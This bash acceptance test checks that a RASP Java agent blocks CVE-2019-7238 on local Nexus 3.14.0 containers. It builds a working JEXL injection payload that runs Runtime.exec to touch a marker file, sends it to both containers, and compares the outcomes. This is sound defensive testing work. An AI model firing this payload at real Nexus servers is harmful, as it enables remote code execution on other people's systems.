#!/usr/bin/env bash
set -euo pipefail

image="${OHMYRASP_VULHUB_NEXUS_7238_IMAGE:-vulhub/nexus:3.14.0}"
baseline_name="${OHMYRASP_VULHUB_NEXUS_7238_BASELINE_NAME:-ohmyrasp-vulhub-nexus7238-baseline}"
protected_name="${OHMYRASP_VULHUB_NEXUS_7238_PROTECTED_NAME:-ohmyrasp-vulhub-nexus7238-protected}"
baseline_port="${OHMYRASP_VULHUB_NEXUS_7238_BASELINE_PORT:-18681}"
protected_port="${OHMYRASP_VULHUB_NEXUS_7238_PROTECTED_PORT:-18682}"
marker="${OHMYRASP_VULHUB_NEXUS_7238_MARKER:-/tmp/ohmyrasp-nexus7238-success}"

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd -- "${script_dir}/../.." && pwd)"
agent_root="${repo_root}/java-agent"
agent_jar="${agent_root}/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
work_dir="${OHMYRASP_VULHUB_NEXUS_7238_WORK_DIR:-/tmp/ohmyrasp-nexus7238}"
artifact="${work_dir}/artifact/demo-1.0.jar"
baseline_response="${work_dir}/baseline-response.txt"
protected_response="${work_dir}/protected-response.txt"
protected_logs="${work_dir}/protected-logs"
protected_log="${protected_logs}/events.jsonl"

cleanup() {
  docker rm -f "${baseline_name}" "${protected_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

json_payload() {
  python3 - "$marker" <<'PY'
import json
import sys

marker = sys.argv[1]
expression = (
    "233.class.forName('java.lang.Runtime').getRuntime().exec("
    + repr("touch " + marker)
    + ")"
)
payload = {
    "action": "coreui_Component",
    "method": "previewAssets",
    "data": [
        {
            "page": 1,
            "start": 0,
            "limit": 50,
            "sort": [{"property": "name", "direction": "ASC"}],
            "filter": [
                {"property": "repositoryName", "value": "*"},
                {"property": "expression", "value": expression},
                {"property": "type", "value": "jexl"},
            ],
        }
    ],
    "type": "rpc",
    "tid": 8,
}
print(json.dumps(payload, separators=(",", ":")))
PY
}

wait_for_http() {
  local port="$1"
  local name="$2"
  for attempt in $(seq 1 150); do
    local status
    status="$(curl -fsS -o /dev/null -w '%{http_code}' "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "${status}" == "200" || "${status}" == "302" ]]; then
      return 0
    fi
    sleep 2
  done
  echo "Nexus ${name} did not become ready" >&2
  docker logs --tail 160 "${name}" >&2 || true
  return 1
}

upload_artifact() {
  local port="$1"
  local status
  status="$(
    curl -sS -o /dev/null -w '%{http_code}' \
      -u admin:admin123 \
      --upload-file "${artifact}" \
      "http://127.0.0.1:${port}/repository/maven-releases/io/ohmyrasp/demo/1.0/demo-1.0.jar"
  )"
  if [[ "${status}" != "201" ]]; then
    echo "Nexus artifact upload failed on port ${port}; status=${status}" >&2
    return 1
  fi
}

send_exploit() {
  local port="$1"
  local response_file="$2"
  local payload
  payload="$(json_payload)"
  curl -sS \
    -o "${response_file}" \
    -X POST "http://127.0.0.1:${port}/service/extdirect" \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    --data-binary "${payload}"
}

jexl_block_count() {
  grep -Ec '"algorithm":"java8_jexl_runtime_execution".*"action":"block"' "${protected_log}" 2>/dev/null || true
}

docker run --rm \
  -v "${agent_root}:/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "${work_dir}"
mkdir -p "${work_dir}/artifact" "${protected_logs}"
printf 'ohmyrasp nexus 7238 marker artifact\n' > "${artifact}"
cleanup

docker run -d \
  --name "${baseline_name}" \
  -p "${baseline_port}:8081" \
  "${image}" >/dev/null

docker run -d \
  --name "${protected_name}" \
  -p "${protected_port}:8081" \
  -v "${agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "${protected_logs}:/opt/ohmyrasp/logs" \
  -e "INSTALL4J_ADD_VM_PARAMS=-Xms1200m -Xmx1200m -XX:MaxDirectMemorySize=2g -Djava.util.prefs.userRoot=/nexus-data/javaprefs -javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "${image}" >/dev/null

wait_for_http "${baseline_port}" "${baseline_name}"
wait_for_http "${protected_port}" "${protected_name}"

if ! grep -q '"jexl_hook":"installed"' "${protected_log}"; then
  echo "protected Nexus Java8 agent did not report installed JEXL hook" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

if grep -q '"event":"ohmyrasp-detection"' "${protected_log}"; then
  echo "protected Nexus logged a detection before the exploit" >&2
  cat "${protected_log}" >&2
  exit 1
fi

upload_artifact "${baseline_port}"
upload_artifact "${protected_port}"

send_exploit "${baseline_port}" "${baseline_response}"
for _ in $(seq 1 20); do
  if docker exec "${baseline_name}" test -f "${marker}"; then
    break
  fi
  sleep 1
done

if ! docker exec "${baseline_name}" test -f "${marker}"; then
  echo "baseline Nexus CVE-2019-7238 exploit did not create marker" >&2
  cat "${baseline_response}" >&2 || true
  docker logs --tail 120 "${baseline_name}" >&2 || true
  exit 1
fi

before_count="$(jexl_block_count)"
send_exploit "${protected_port}" "${protected_response}"
for _ in $(seq 1 20); do
  after_count="$(jexl_block_count)"
  if [[ "${after_count}" -gt "${before_count}" ]]; then
    break
  fi
  sleep 1
done

after_count="$(jexl_block_count)"
if [[ "${after_count}" -le "${before_count}" ]]; then
  echo "missing java8_jexl_runtime_execution block event for Nexus CVE-2019-7238" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi

if docker exec "${protected_name}" test -f "${marker}"; then
  echo "protected Nexus CVE-2019-7238 exploit created marker despite RASP" >&2
  cat "${protected_log}" >&2 || true
  exit 1
fi

if grep -q '"algorithm":"java8_command_execution_exploit_primitive"' "${protected_log}"; then
  echo "Nexus CVE-2019-7238 reached Runtime.exec instead of stopping at JEXL evaluation" >&2
  cat "${protected_log}" >&2
  exit 1
fi

if grep -q 'ohmyrasp-nexus7238-success' "${protected_log}"; then
  echo "protected JEXL event leaked the raw Nexus payload marker" >&2
  cat "${protected_log}" >&2
  exit 1
fi

echo "vulhub Nexus CVE-2019-7238 Java8 acceptance passed"
